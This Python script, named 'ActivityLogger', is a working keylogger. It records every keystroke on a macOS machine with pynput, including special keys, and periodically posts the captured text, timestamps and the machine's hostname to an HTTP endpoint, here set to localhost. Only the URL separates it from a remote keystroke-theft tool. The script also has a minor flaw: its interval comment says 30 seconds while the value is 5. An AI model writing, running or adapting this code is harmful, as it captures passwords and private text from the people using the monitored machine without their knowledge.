from pynput import keyboard
import requests
from threading import Timer
from datetime import datetime
import platform

# Localhost configuration
SEND_REPORT_EVERY = 5  # Send logs every 30 seconds
SERVER_URL = "http://localhost:8000/api/logs"

class ActivityLogger:
    def __init__(self, interval, server_url):
        self.interval = interval
        self.server_url = server_url
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        
    def on_press(self, key):
        """Captures keyboard events"""
        try:
            # Regular character keys
            self.log += key.char
        except AttributeError:
            # Special keys
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "[ENTER]\n"
            elif key == keyboard.Key.tab:
                self.log += "[TAB]"
            elif key == keyboard.Key.backspace:
                self.log += "[BACKSPACE]"
            else:
                self.log += f"[{str(key).replace('Key.', '').upper()}]"
    
    def send_to_server(self, log_data):
        """Send logs to localhost server"""
        try:
            payload = {
                "timestamp": datetime.now().isoformat(),
                "start_time": self.start_dt.isoformat(),
                "end_time": self.end_dt.isoformat(),
                "log_data": log_data,
                "machine_id": f"{platform.node()}_{platform.system()}"
            }
            
            response = requests.post(
                self.server_url,
                json=payload,
                timeout=5
            )
            
            if response.status_code == 200:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] ✓ Logs sent successfully")
            else:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] ✗ Failed: {response.status_code}")
                
        except requests.exceptions.ConnectionError:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] ✗ Cannot connect to server. Is it running?")
        except Exception as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] ✗ Error: {str(e)}")
    
    def report(self):
        """Periodically send logs to server"""
        if self.log:
            self.end_dt = datetime.now()
            self.send_to_server(self.log)
            self.start_dt = datetime.now()
            self.log = ""
        
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
    
    def start(self):
        """Start the activity logger"""
        self.start_dt = datetime.now()
        
        print(f"{'='*60}")
        print(f"Activity Logger Started (macOS)")
        print(f"Server: {self.server_url}")
        print(f"Interval: {self.interval} seconds")
        print(f"{'='*60}")
        print("Press CTRL+C to stop\n")
        
        # Start periodic reporting
        self.report()
        
        # Start keyboard listener (pynput style)
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    try:
        logger = ActivityLogger(
            interval=SEND_REPORT_EVERY,
            server_url=SERVER_URL
        )
        logger.start()
    except KeyboardInterrupt:
        print(f"\n[{datetime.now().strftime('%H:%M:%S')}] Logger stopped")
